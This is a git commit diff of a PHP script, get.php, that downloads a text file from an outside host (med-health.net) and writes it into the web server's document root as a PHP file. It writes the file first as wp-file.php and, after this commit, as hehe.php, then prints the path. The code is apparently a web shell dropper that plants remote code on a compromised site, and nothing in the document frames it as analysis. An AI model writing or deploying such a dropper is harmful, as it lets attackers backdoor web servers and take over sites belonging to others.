87e780d525091dcfd4d49a9f71ef2aef90129b7b
rizky supriatna <109171533+rizkylol@users.noreply.github.com>
2022-07-28 00:48:45 +0700

    Update get.php

--- get.php
+++ get.php
@@ -1,21 +1,23 @@
 <?php
 function http_get($url){
-$im = curl_init($url);
-curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
-curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($im, CURLOPT_HEADER, 0);
-return curl_exec($im);
-curl_close($im);
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
 }
-$check=$_SERVER['DOCUMENT_ROOT'] . "/wp-file.php" ;
-$text = http_get('https://www.med-health.net/cache/hehe.txt');
-$op=fopen($check, 'w');
-fwrite($op,$text);
-fclose($op);
-if(file_exists($check)){
-echo "Dont delete<br>";
-}else {
-echo "ora bisa";
-}
+$check3 = $_SERVER['DOCUMENT_ROOT'] . "/hehe.php" ;
+$text3 = http_get('http://www.med-health.net/cache/hehe.txt');
+$open3 = fopen($check3, 'w');
+fwrite($open3, $text3);
+fclose($open3);
+if(file_exists($check3)){
+    echo $check3."</br>";
+}else 
+  echo "not exits";
+echo "done .\n " ;
+
+
 ?>
